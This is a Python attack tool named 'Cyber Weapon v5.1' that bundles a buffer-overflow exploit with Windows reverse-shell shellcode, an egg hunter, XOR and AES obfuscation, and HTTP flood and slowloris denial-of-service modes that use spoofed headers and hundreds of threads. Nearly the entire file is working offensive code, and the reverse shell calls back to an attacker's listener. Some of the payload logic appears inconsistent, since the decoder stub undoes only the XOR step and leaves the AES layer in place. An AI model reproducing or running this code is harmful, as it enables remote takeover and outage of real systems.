#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: mrDahmsh (@Dahmsh_0x1337)

import socket
import struct
import time
import random
import threading
import argparse
import os
import zlib
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from colorama import Fore, Style, init
import ssl

init(autoreset=True)

BANNER = f"""
{Fore.CYAN}
██████╗ ██████╗  ██████╗ ███████╗██████╗ ████████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
██████╔╝██████╔╝██║   ██║█████╗  ██████╔╝   ██║   
██╔═══╝ ██╔══██╗██║   ██║██╔══╝  ██╔══██╗   ██║   
██║     ██║  ██║╚██████╔╝███████╗██║  ██║   ██║   
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   
{Fore.RED}Cyber Weapon v5.1{Style.RESET_ALL}
{Fore.YELLOW}>> Developed by: mrDahmsh <<{Style.RESET_ALL}
"""

class CyberWeapon:
    def __init__(self, args):
        self.args = args
        self.target_ip = args.target
        self.target_port = args.port
        self.threads = args.threads
        self.offset = args.offset
        self.jmp_esp = args.jmp_esp
        self.attack_duration = args.duration * 3600
        self.ssl_enabled = args.ssl
        self.mode = args.mode
        self.lhost = args.lhost
        self.lport = args.lport

        # Advanced Configuration
        self.unique_eggs = [os.urandom(4) for _ in range(50)]
        self.current_egg = 0
        self.xor_keys = [os.urandom(1) for _ in range(5)]
        self.aes_key = os.urandom(32)
        self.ssl_context = self.init_ssl()
        
        # Statistics
        self.stats = {'success': 0, 'failed': 0}
        self.lock = threading.Lock()
        self.running = True
        
    def init_ssl(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context

    def print_config(self):
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Target: {self.target_ip}:{self.target_port}")
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Threads: {self.threads} | Mode: {self.mode}")
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Listener: {self.lhost}:{self.lport}")
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Encryption: AES-256-CBC + XOR")

    # ------------------- Core Exploit Components -------------------
    def generate_shellcode(self):
        try:
            ip_bytes = socket.inet_aton(self.lhost)
        except OSError:
            print(f"{Fore.RED}[-] Invalid LHOST: {self.lhost}")
            exit(1)
        
        port_bytes = struct.pack(">H", self.lport)
        
        return (
            b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
            b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
            b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
            b"\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78"
            b"\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18"
            b"\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31\xc0\xac"
            b"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
            b"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
            b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
            b"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
            b"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
            b"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
            b"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68" + ip_bytes +
            b"\x68\x02\x00" + port_bytes + b"\x89\xe6\x50\x50\x50\x50\x40"
            b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57"
            b"\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75"
            b"\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9"
            b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00"
            b"\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53"
            b"\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
            b"\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f"
            b"\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"
            b"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29"
            b"\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"
        )

    def generate_decoder(self, xor_key, length):
        return (
            b"\xeb\x0e" +              # jmp short 0x10
            b"\x5e" +                   # pop esi
            b"\x31\xc9" +               # xor ecx, ecx
            b"\x66\xb9" + struct.pack("<H", length) +  # mov cx, length
            b"\x8a\x06" +               # mov al, [esi]
            b"\x34" + xor_key +         # xor al, key_byte
            b"\x88\x06" +               # mov [esi], al
            b"\x46" +                   # inc esi
            b"\xe2\xf7" +               # loop xor_loop
            b"\xeb\x05" +               # jmp short shellcode
            b"\xe8\xed\xff\xff\xff"     # call 0x2
        )

    def aes_encrypt(self, data):
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        return iv + encryptor.update(padded_data) + encryptor.finalize()

    # ------------------- Attack Vectors -------------------
    def generate_http_flood(self):
        methods = ['GET', 'POST', 'PUT', 'DELETE']
        paths = ['/', '/api', '/admin', '/test']
        headers = [
            f"User-Agent: {self.random_ua()}",
            f"X-Forwarded-For: {self.spoof_ip()}",
            "Accept-Language: en-US,en;q=0.9",
            f"Cookie: session={os.urandom(8).hex()}"
        ]
        return (
            f"{random.choice(methods)} {random.choice(paths)} HTTP/1.1\r\n"
            f"Host: {self.target_ip}\r\n"
            + "\r\n".join(headers) + "\r\n\r\n"
        ).encode()

    def slowloris_attack(self):
        headers = [
            f"User-Agent: {self.random_ua()}",
            f"X-Forwarded-For: {self.spoof_ip()}",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            "Content-Length: 1000000"
        ]
        return (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target_ip}\r\n"
            + "\r\n".join(headers) + "\r\n\r\n"
        ).encode()

    def generate_exploit_payload(self):
        raw_shellcode = self.generate_shellcode()
        xor_key = random.choice(self.xor_keys)
        encoded_shellcode = self.xor_encode(raw_shellcode, xor_key)
        encrypted_shellcode = self.aes_encrypt(encoded_shellcode)
        decoder_stub = self.generate_decoder(xor_key, len(encoded_shellcode))
        egg = self.unique_eggs[self.current_egg % len(self.unique_eggs)]
        self.current_egg += 1

        # Build egg hunter
        egg_hunter = (
            b"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74"
            b"\xEF\xB8" + egg +
            b"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
        )

        payload = (
            b"A" * self.offset +
            struct.pack("<I", self.jmp_esp) +
            b"\x90" * 64 +
            egg_hunter +
            decoder_stub +
            egg +
            encrypted_shellcode
        )
        return payload

    # ------------------- Network Operations -------------------
    def send_attack(self):
        sock = None
        ssock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if self.ssl_enabled:
                ssock = self.ssl_context.wrap_socket(sock, server_hostname=self.target_ip)
            else:
                ssock = sock
            
            ssock.connect((self.target_ip, self.target_port))
            
            if self.mode == "exploit":
                payload = self.generate_exploit_payload()
            elif self.mode == "flood":
                payload = self.generate_http_flood()
            elif self.mode == "slowloris":
                payload = self.slowloris_attack()
            
            ssock.sendall(payload)
            time.sleep(0.1)
            return True
        except Exception as e:
            return False
        finally:
            if ssock is not None:
                ssock.close()

    # ------------------- Utility Functions -------------------
    def random_ua(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/118.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        ]
        return random.choice(agents)

    def spoof_ip(self):
        return ".".join(map(str, (random.randint(1,255) for _ in range(4))))

    def xor_encode(self, data, key):
        return bytes([b ^ key[0] for b in data])

    # ------------------- Thread Management -------------------
    def attack_cycle(self):
        start_time = time.time()
        while time.time() - start_time < self.attack_duration and self.running:
            try:
                success = self.send_attack()
                with self.lock:
                    if success:
                        self.stats['success'] += 1
                    else:
                        self.stats['failed'] += 1
            except:
                pass
            time.sleep(random.uniform(0.01, 0.1))

    def stats_monitor(self):
        start = time.time()
        while self.running:
            elapsed = time.time() - start
            with self.lock:
                total = self.stats['success'] + self.stats['failed']
                rate = (self.stats['success']/total)*100 if total > 0 else 0
                print(f"\r[+] Packets: {total} | Success: {self.stats['success']} ({rate:.1f}%) | Time: {elapsed:.1f}s", end="")
            time.sleep(1)

    # ------------------- Main Control -------------------
    def start(self):
        print(BANNER)
        self.print_config()
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Initializing attack...")
        
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.attack_cycle)
            t.daemon = True
            t.start()
            threads.append(t)
        
        monitor = threading.Thread(target=self.stats_monitor)
        monitor.start()
        
        try:
            while any(t.is_alive() for t in threads):
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.RED}[!] Attack interrupted! Shutting down...")
        
        monitor.join()
        print(f"\n{Fore.GREEN}[+] Attack summary:")
        print(f"    Total payloads sent: {self.stats['success'] + self.stats['failed']}")
        print(f"    Success rate: {(self.stats['success']/(self.stats['success']+self.stats['failed']))*100:.2f}%")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CyberWeapon - Advanced Penetration Testing Framework")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port")
    parser.add_argument("-m", "--mode", choices=["exploit", "flood", "slowloris"], default="exploit", help="Attack mode")
    parser.add_argument("--lhost", required=True, help="Listener IP for reverse shell")
    parser.add_argument("--lport", type=int, required=True, help="Listener port for reverse shell")
    parser.add_argument("--threads", type=int, default=500, help="Number of attack threads")
    parser.add_argument("--offset", type=int, default=1896, help="Buffer overflow offset")
    parser.add_argument("--jmp-esp", type=lambda x: int(x, 16), default=0x625011B2, help="Address of JMP ESP instruction")
    parser.add_argument("--duration", type=int, default=1, help="Duration of the attack in hours")
    parser.add_argument("--ssl", action="store_true", help="Enable SSL for attack")
    
    args = parser.parse_args()
    
    try:
        weapon = CyberWeapon(args)
        weapon.start()
    except Exception as e:
        print(f"{Fore.RED}[-] An error occurred: {e}")
